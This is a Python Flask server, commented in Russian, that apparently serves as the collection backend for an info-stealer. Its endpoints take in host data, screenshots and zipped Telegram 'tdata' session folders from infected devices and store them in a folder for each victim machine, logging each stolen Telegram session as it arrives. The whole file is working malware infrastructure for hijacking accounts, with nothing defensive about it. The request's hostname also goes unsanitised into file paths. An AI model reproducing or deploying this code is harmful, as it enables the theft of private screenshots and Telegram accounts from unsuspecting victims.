from flask import Flask, request, jsonify
import json
import os
from datetime import datetime
import zipfile
import io

app = Flask(__name__)

# Базовые папки
BASE_DIR = r'D:\new project\logs'  # или оставь 'logs' для Render
os.makedirs(BASE_DIR, exist_ok=True)

@app.route('/data', methods=['POST'])
def receive_data():
    data = request.get_json()
    hostname = data.get('hostname', 'unknown')
    
    # Создаём папку для устройства
    device_dir = os.path.join(BASE_DIR, hostname)
    os.makedirs(device_dir, exist_ok=True)
    
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    
    # Сохраняем JSON
    json_filename = os.path.join(device_dir, f'info_{timestamp}.json')
    with open(json_filename, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=4, ensure_ascii=False)
    
    print(f'[+] Сохранено: {json_filename}')
    return 'OK', 200

@app.route('/upload', methods=['POST'])
def upload_file():
    # Получаем JSON данные
    data = json.loads(request.form.get('json', '{}'))
    hostname = data.get('hostname', 'unknown')
    
    device_dir = os.path.join(BASE_DIR, hostname)
    os.makedirs(device_dir, exist_ok=True)
    
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    
    # Сохраняем JSON
    json_filename = os.path.join(device_dir, f'info_{timestamp}.json')
    with open(json_filename, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=4, ensure_ascii=False)
    
    # Сохраняем файлы
    if 'screenshot' in request.files:
        screenshot = request.files['screenshot']
        screenshot_filename = os.path.join(device_dir, f'screenshot_{timestamp}.png')
        screenshot.save(screenshot_filename)
        print(f'[+] Скриншот сохранён: {screenshot_filename}')
    
    if 'tdata' in request.files:
        tdata_zip = request.files['tdata']
        tdata_filename = os.path.join(device_dir, f'tdata_{timestamp}.zip')
        tdata_zip.save(tdata_filename)
        print(f'[+] Telegram tdata сохранён: {tdata_filename}')
    
    return 'OK', 200

@app.route('/')
def index():
    return "Server running"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
